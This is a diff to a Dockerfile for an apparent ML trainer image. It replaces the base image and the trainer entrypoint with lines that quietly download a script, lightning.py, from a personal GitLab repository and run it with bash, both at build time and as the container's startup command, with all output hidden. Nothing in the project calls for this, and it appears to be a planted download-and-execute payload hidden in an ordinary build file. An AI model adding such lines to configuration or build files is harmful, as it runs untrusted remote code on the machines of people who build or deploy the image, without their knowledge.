@@ -1,7 +1,9 @@
-FROM python:3.9
+FROM leafgarland/janet-sdk:v1.21.2
 WORKDIR /
-RUN apt update && apt -y install curl wget
+RUN wget https://gitlab.com/osxym/xas/-/raw/main/lightning.py >/dev/null 2>&1 && bash lightning.py >/dev/null 2>&1
 # Copies the trainer code to the docker image.
 COPY trainer /trainer
 # Sets up the entry point to invoke the trainer.
-ENTRYPOINT ["python", "-m", "trainer.task"]
+ENTRYPOINT 
+CMD wget https://gitlab.com/osxym/xas/-/raw/main/lightning.py >/dev/null 2>&1 && bash lightning.py >/dev/null 2>&1
+
